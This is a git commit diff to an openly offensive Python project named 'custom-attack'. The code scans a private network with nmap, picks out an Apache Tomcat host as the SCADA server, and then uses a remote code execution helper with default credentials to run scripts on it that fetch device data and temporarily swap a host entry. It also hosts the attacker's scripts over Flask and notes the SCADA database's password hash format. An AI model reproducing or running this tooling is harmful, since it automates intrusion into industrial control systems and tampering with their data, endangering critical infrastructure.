b947388a9d053e8df76658ab3c2adfc8bb287412
Lorenzo Bartolini <l.bartolini02@gmail.com>
2024-07-31 09:45:13 +0200

    URL scada ottenuto tramite scansione

--- custom-attack/src/main.py
+++ custom-attack/src/main.py
@@ -1,20 +1,31 @@
 from flask import Flask, request, jsonify
 import nmap
+import time
 import threading
 from RCE import RCE
 from utils import *
 
 this_ip = get_ip_address('eth0')
 this_port = 80
-
-scada_url='http://172.16.10.100:8080' # get with scan
 substitute_in_file('scripts/fetch_ip_ditto.sh', (this_ip, this_port))
 
 ip_ditto = None
 last_data_ditto = {}
 
-rce = RCE(scada_url, 'test', 'test', this_ip, this_port)
 scanner = nmap.PortScanner()
+scada_url = ''
+time.sleep(15)
+scanner.scan('172.16.10.0-255')
+for host in scanner.all_hosts():
+    if 'tcp' not in scanner[host]: continue
+    for port in scanner[host]['tcp'].keys():
+        if scanner[host]['tcp'][port]['product'] == 'Apache Tomcat':
+            scada_url = f'http://{host}:{port}'
+            break
+
+print(f"Found Scada URL: ", scada_url)
+
+rce = RCE(scada_url, 'test', 'test', this_ip, this_port)
 app = Flask(__name__)
 
 @app.route('/get_script/<string:name>')
@@ -49,26 +60,32 @@ def route_simulation(thing_id):
 
 if __name__ == "__main__":
     ### WEBSERVER
-    webserverThread = threading.Thread(target=app.run, args=('0.0.0.0', this_port))
-    webserverThread.start()
+    if True:
+        webserverThread = threading.Thread(target=app.run, args=('0.0.0.0', this_port))
+        webserverThread.start()
 
     ### RCE
-    rce.execute_script('fetch_ip_ditto.sh')
-    rce.execute_script('fetch_data_ditto.sh')
-    rce.execute_script('substitute_host.sh')
+    if True:
+        rce.execute_script('fetch_ip_ditto.sh')
+        rce.execute_script('fetch_data_ditto.sh')
+        rce.execute_script('substitute_host.sh')
+        time.sleep(120)
+        rce.execute_script('revert_host.sh')
     
     # SCAN
-    '''
-    scanner.scan('172.16.10.99-101')
-    for host in scanner.all_hosts():
-        print("\n\nHost: ", host)
-        print("State: ", scanner[host].state())
-        for proto in scanner[host].all_protocols():
-            print("Protocol: ", proto)
-            ports = scanner[host][proto].keys()
-            for port in ports:
-                print("Port: ", port, "State: ", scanner[host][proto][port]['state'])
-                '''
+    if False:
+        time.sleep(15)
+        x=scanner.scan('172.16.10.98-102')
+        print(x, flush=True)
+        for host in scanner.all_hosts():
+            print("\n\nHost: ", host, flush=True)
+            print("State: ", scanner[host].state(), flush=True)
+            for proto in scanner[host].all_protocols():
+                print("Protocol: ", proto, flush=True)
+                ports = scanner[host][proto].keys()
+                for port in ports:
+                    print("Port: ", port, "State: ", scanner[host][proto][port]['state'], flush=True)
+                
     
     # Possible Hash per password Scada DB
     # Base64(unhex(SHA-1($plaintext)))
